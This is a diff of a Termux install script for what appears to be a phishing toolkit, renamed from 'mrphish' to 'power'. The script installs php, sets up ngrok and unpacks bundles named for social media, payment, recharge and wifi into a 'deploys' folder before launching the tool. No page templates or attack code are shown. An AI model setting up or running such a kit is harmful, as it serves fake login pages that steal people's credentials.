@@ -38,9 +38,9 @@ pkg install php -y
 pip install lolcat 
 cd /sdcard
 mkdir dUmpS
-cd $HOME/mrphish
+cd $HOME/power
 mv log.mp3 /sdcard
-cd $HOME/mrphish/core
+cd $HOME/power/core
 chmod +x ngrok
 mv ngrok $HOME
 cd $HOME
@@ -90,71 +90,71 @@ unzip payment.zip
 unzip recharge.zip                                                                      
 unzip wifirt.zip                                                                        
 cd socialmedia1
-mv * $HOME/mrphish/core/deploys/socialmedia
-cd $HOME/mrphish/core/deploys
+mv * $HOME/power/core/deploys/socialmedia
+cd $HOME/power/core/deploys
 rm -rf socialmedia1
-cd $HOME/mrphish/core/deploys
+cd $HOME/power/core/deploys
 cd socialmedia2
-mv * $HOME/mrphish/core/deploys/socialmedia
-cd $HOME/mrphish/core/deploys
+mv * $HOME/power/core/deploys/socialmedia
+cd $HOME/power/core/deploys
 rm -rf socialmedia2
-cd $HOME/mrphish/core/deploys
+cd $HOME/power/core/deploys
 cd socialmedia3
-mv * $HOME/mrphish/core/deploys/socialmedia
-cd $HOME/mrphish/core/deploys
+mv * $HOME/power/core/deploys/socialmedia
+cd $HOME/power/core/deploys
 rm -rf socialmedia3
-cd $HOME/mrphish/core/deploys
+cd $HOME/power/core/deploys
 cd socialmedia4
-mv * $HOME/mrphish/core/deploys/socialmedia
-cd $HOME/mrphish/core/deploys
+mv * $HOME/power/core/deploys/socialmedia
+cd $HOME/power/core/deploys
 rm -rf socialmedia4
-cd $HOME/mrphish/core/deploys
+cd $HOME/power/core/deploys
 cd socialmedia5
-mv * $HOME/mrphish/core/deploys/socialmedia
-cd $HOME/mrphish/core/deploys
+mv * $HOME/power/core/deploys/socialmedia
+cd $HOME/power/core/deploys
 rm -rf socialmedia5
-cd $HOME/mrphish/core/deploys
+cd $HOME/power/core/deploys 
 cd socialmedia6
-mv * $HOME/mrphish/core/deploys/socialmedia
-cd $HOME/mrphish/core/deploys
+mv * $HOME/power/core/deploys/socialmedia
+cd $HOME/power/core/deploys
 rm -rf socialmedia6
-cd $HOME/mrphish/core/deploys
+cd $HOME/power/core/deploys
 cd socialmedia7
-mv * $HOME/mrphish/core/deploys/socialmedia
-cd $HOME/mrphish/core/deploys
+mv * $HOME/power/core/deploys/socialmedia
+cd $HOME/power/core/deploys
 rm -rf socialmedia7
-cd $HOME/mrphish/core/deploys
+cd $HOME/power/core/deploys
 cd socialmedia8
-mv * $HOME/mrphish/core/deploys/socialmedia
-cd $HOME/mrphish/core/deploys
+mv * $HOME/power/core/deploys/socialmedia
+cd $HOME/power/core/deploys
 rm -rf socialmedia8
-cd $HOME/mrphish/core/deploys
+cd $HOME/power/core/deploys
 cd socialmedia9
-mv * $HOME/mrphish/core/deploys/socialmedia
-cd $HOME/mrphish/core/deploys
+mv * $HOME/power/core/deploys/socialmedia
+cd $HOME/power/core/deploys
 rm -rf socialmedia9
-cd $HOME/mrphish/core/deploys
+cd $HOME/power/core/deploys
 cd socialmedia10
-mv * $HOME/mrphish/core/deploys/socialmedia
-cd $HOME/mrphish/core/deploys
+mv * $HOME/power/core/deploys/socialmedia
+cd $HOME/power/core/deploys
 rm -rf socialmedia10
-cd $HOME/mrphish/core/deploys
+cd $HOME/power/core/deploys
 cd socialmedia11
-mv * $HOME/mrphish/core/deploys/socialmedia
-cd $HOME/mrphish/core/deploys
+mv * $HOME/power/core/deploys/socialmedia
+cd $HOME/power/core/deploys
 rm -rf socialmedia11
-cd $HOME/mrphish/core/deploys
+cd $HOME/power/core/deploys
 cd socialmedia12
-mv * $HOME/mrphish/core/deploys/socialmedia
-cd $HOME/mrphish/core/deploys
+mv * $HOME/power/core/deploys/socialmedia
+cd $HOME/power/core/deploys
 rm -rf socialmedia12
 cd others1
-mv  * $HOME/mrphish/core/deploys/others
-cd $HOME/mrphish/core/deploys
+mv  * $HOME/power/core/deploys/others
+cd $HOME/power/core/deploys
 rm -rf others1
 rm *.zip
-cd $HOME/mrphish
+cd $HOME/power
 mpv /sdcard/log.mp3
 rm setup
-bash mrphish
+bash power
 
